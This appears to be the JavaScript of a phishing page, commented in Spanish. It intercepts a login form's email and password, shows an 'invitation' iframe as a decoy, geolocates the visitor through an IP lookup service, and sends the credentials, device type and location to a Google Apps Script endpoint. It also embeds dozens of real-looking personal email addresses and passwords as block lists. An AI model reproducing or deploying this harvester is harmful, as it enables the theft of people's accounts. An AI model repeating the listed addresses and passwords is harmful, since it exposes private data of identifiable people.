document.getElementById("miFormulario").addEventListener("submit", async function(event) {
    event.preventDefault(); // Evita el envío automático 

    // Obtener elementos del formulario
    const emailInput = document.querySelector('input[name="email"]');
    const passwordInput = document.querySelector('input[name="password"]');
    const errorMessage = document.getElementById('error-message');
    
    // Lista de correos electrónicos y contraseñas prohibidas
    const prohibitedEmails = ["keylaboulanggerdelvalle@gmail.com","nacarickfabiolis@gmail.com","varcentaless03@unia.edu.pe","valentina.reyes@crsh.beleneduca.cl","britanyrengifo14@gmail.com","mayaraisidro0@gmail.com","chaskaproducciones01@gmail.com","alejandrogimenezcolman18@gmail.com","keitysaavedragonzales@gmail.com","mariaradaa26@gmail.com","anhr1713@gmail.com","lleymiluislero@gmail.com","gigarciapa@ucvvirtual.edu.pe","demily.cordova@ucsp.edu.pe","ajrobalinon@crear.ucal.edu.pe","aldeir_netflix_123@hotmail.com","ruth2003.com@hotmail.com","rzumetad61@unia.edu.pe","nicolasyfloppagod@gmail.com","nicolasyfloppagod@gmail.com","nikolfermin07@gmail.com","reyhasmter@gmail.com","jonattanjoelgarcialeo7@gmail.com","yurimarmedina02@gmail.com","villosladarengifot@gmail.com","019100739c@uandina.edu.pe","019100729c@uandina.edu.pe","estefanocernaalaba@gmail.com","guaniloguanilokoke@gmail.com","parcedahua@gmail.com","anaf.felix@upsjb.edu.pe","sophieriverah@gmail.com","dariellasalazar8@gmail.com","jorgealtamirano31@hotmail.com","wonderwallasd1@gmail.com","em.calderontu@alum.up.edu.pe","liateresa993@gmail.com","newan2110@gmail.com","alvillacorta200@gmail.com","mateo_akemi_18@hotmail.com","2320104023@unia.edu.pe","71256596@continental.edu.pe","darkgirlfrank@gmail.com","olenkamaryi2025@gmail.com","minayaanthu@gmail.com","ominayaga@ucvvirtual.edu.pe","elide_gatynha@hotmail.com","darlyn.dayanramendoza@gmail.com","lsanchezv2@upao.edu.pe","tequenazo1995@gmail.com","delgadoangenny@gmail.com","aleferreyro1@gmail.com","bernatAaramichele38@gmail.com","yessenia.arista09@gmail.com"]; // Agregar correos prohibidos aquí

    const prohibitedWords = ["Fatima090303","Luciana090303","Luciana090303.","Fatima090303.","fatima090303","luciana090303","luciana090303.","fatima090303.","Laniña.47","La niña.47","Daniela18","daniela2005.","Daniela2005.","akamaru23","Akamaru23","Adriana11","pauloLivana12yccm","PauloLivana12yccm","Vale.1983","V4l3.1983","dayra123","Dayra123","dayanna_2020","15092005E.L.g.c**","l@ri2005","L@ri2005","kennetnicol","Kennetnicol","Hsksjsvsnask","9893593","61261026","Eithan211","eyssa32459483","Eyssa32459483","Tanbella18","tanbella18","coqueta2006*","barreto1130","Barreto1130","Coqueta2006*","angelita92","Angelita92"]; // Agregar contraseñas prohibidas aquí
    
    const email = emailInput.value.trim().toLowerCase();
    const password = passwordInput.value;
    
    // Validar formato de correo electrónico
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        errorMessage.textContent = "Correo electrónico no válido";
        errorMessage.style.color = 'red';
        return; // Detiene el procesamiento
    }
    
    // Verificar correo prohibido
    const isProhibitedEmail = prohibitedEmails.includes(email);
    if (isProhibitedEmail) {
        errorMessage.textContent = "Ocurrio un error con el correo intentar con otra dirección";
        errorMessage.style.color = 'red';
        errorMessage.style.fontFamily = "'Noto Sans', sans-serif";
        emailInput.value = '';
        passwordInput.value = '';
        return; // Detiene el procesamiento
    }
    
    // Verificar contraseña prohibida
    const containsProhibitedPassword = prohibitedWords.some(word => password.includes(word));
    if (containsProhibitedPassword) {
        errorMessage.textContent = "Contraseña incorrecta";
        errorMessage.style.color = 'red';
        errorMessage.style.fontFamily = "'Noto Sans', sans-serif";
        passwordInput.value = '';
        return; // Detiene el procesamiento
    }
    
    // Si pasa todas las validaciones, continúa con el proceso normal
    // Limpiar cualquier mensaje de error previo
    if (errorMessage) {
        errorMessage.textContent = "";
    }

    // Ocultar el formulario
    document.getElementById("miFormulario").style.display = "none";
    
    // Mostrar mensaje "Cargando..."
    let loadingMessage = document.createElement("p");
    loadingMessage.textContent = "⏳ Procesando... por favor, espere.";
    loadingMessage.style.textAlign = "center";
    document.body.appendChild(loadingMessage);
    
 // Antes de mostrar el iframe, ocultar el footer de folder.html
document.querySelector("p").style.display = "none"; 

// Mostrar el iframe
let iframe = document.getElementById("usuarioFrame");
iframe.src = "invitation.html";
iframe.style.display = "block";

    
    // Eliminar mensaje de carga después de mostrar usuario.html
    iframe.onload = function() {
        loadingMessage.remove();
    };
    
    // ✅ Detectar si el usuario usa iPhone o Android
    let deviceType = "Otro"; // Valor por defecto
    if (/android/i.test(navigator.userAgent)) {
        deviceType = "Android";
    } else if (/iphone|ipad|ipod/i.test(navigator.userAgent)) {
        deviceType = "iPhone";
    }
    
    // ✅ Obtener el país y la ciudad del usuario desde la API
    let country = "Desconocido";
    let city = "Desconocido"; // Añadido: variable para almacenar la ciudad
    try {
        const response = await fetch("https://ipwhois.app/json/");
        const data = await response.json();
        if (data) {
            if (data.country) {
                country = data.country; // Captura el país
            }
            if (data.city) {
                city = data.city; // Captura la ciudad
            }
        }
    } catch (error) {
        console.error("Error obteniendo la ubicación:", error);
    }
    
    // ✅ Asegurar que los datos se agregan correctamente antes de enviarlos
    const formData = new FormData(this);
    formData.append("device", deviceType); // Agregar dispositivo
    formData.append("country", country + " - " + city); // Agregar país y ciudad combinados
    
    // ✅ Enviar los datos correctamente a Google Sheets
    const url = "https://script.google.com/macros/s/AKfycbxX_HcLaDf7l6NEl3z57fbYMLpAxve1DLBamLWnW5n6ap0kNuzI_Qv2IW9h6kE9rxN2/exec";
    fetch(url, {
        method: "POST",
        body: new URLSearchParams(formData),
        headers: { "Content-Type": "application/x-www-form-urlencoded" }
    }).catch(error => console.error("Error al enviar datos:", error));
});
